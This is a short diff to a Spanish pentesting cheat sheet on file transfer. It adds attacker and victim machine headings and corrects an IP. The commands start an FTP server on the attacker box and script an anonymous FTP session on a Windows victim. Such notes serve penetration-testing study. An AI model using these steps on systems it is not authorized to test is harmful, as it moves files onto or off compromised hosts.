@@ -24,15 +24,19 @@ scp <binario> <user>@<ip>:/tmp
   <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">FTP</div>
 </div>
 
+**Máquina Atacante**
+
 Levantar un servidor FTP en la máquina atacante:
 ~~~bash
 pip3 install pyftpdlib ; python3 -m pyftpdlib -p 21
 ~~~
 
+**Máquina Víctima**
+
 Guardar comandos FTP en un fichero dentro del sistema Windows:
 
 ~~~bash
-echo open 192.168.150 21 > ftp.txt
+echo open 192.168.1.150 21 > ftp.txt
 echo USER anonymous >> ftp.txt
 echo anonymous >> ftp.txt
 echo bin >> ftp.txt
